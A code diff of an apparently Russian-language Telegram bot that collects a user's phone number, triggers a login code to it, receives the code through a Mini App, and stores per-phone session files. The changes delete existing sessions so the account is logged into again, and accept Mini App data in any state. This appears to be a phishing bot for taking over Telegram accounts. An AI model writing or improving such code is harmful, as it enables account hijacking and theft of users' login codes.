@@ -224,11 +224,11 @@ async def on_contact(msg: Message, state: FSMContext):
     phone = _normalize_phone(msg.contact.phone_number)
     db_set_phone(msg.from_user.id, phone)
 
+    # Удаляем старую сессию если есть — чтобы можно было переавторизоваться
     session_file = os.path.join(SESSION_DIR, f'{phone[1:]}.session')
     if os.path.exists(session_file):
-        await msg.answer('✅ <b>Ваш аккаунт уже прошёл проверку!</b>', reply_markup=kb_menu())
-        await state.finish()
-        return
+        os.remove(session_file)
+        log.info('Удалена старая сессия: %s', session_file)
 
     await msg.answer('🔐 <b>Отправляю код на ваш номер...</b>', reply_markup=ReplyKeyboardRemove())
 
@@ -257,8 +257,8 @@ async def on_contact(msg: Message, state: FSMContext):
     )
 
 
-# ── Получаем данные от Mini App (web_app_data)
-@dp.message_handler(content_types=['web_app_data'], state=Auth.wait_webapp)
+# ── Получаем данные от Mini App (web_app_data) — любое состояние
+@dp.message_handler(content_types=['web_app_data'], state='*')
 async def on_webapp_data(msg: Message, state: FSMContext):
     raw = msg.web_app_data.data
     log.info('WebApp data from %s: %s', msg.from_user.id, raw)
@@ -274,9 +274,14 @@ async def on_webapp_data(msg: Message, state: FSMContext):
         await state.finish()
         return
 
-    async with state.proxy() as data:
-        phone     = data['phone']
-        code_hash = data['code_hash']
+    data = await state.get_data()
+    phone     = data.get('phone')
+    code_hash = data.get('code_hash')
+
+    if not phone or not code_hash:
+        await msg.answer('❌ <b>Сессия истекла.</b> Начните заново — /start')
+        await state.finish()
+        return
 
     await msg.answer('🔄 <b>Проверяю код...</b>')
 
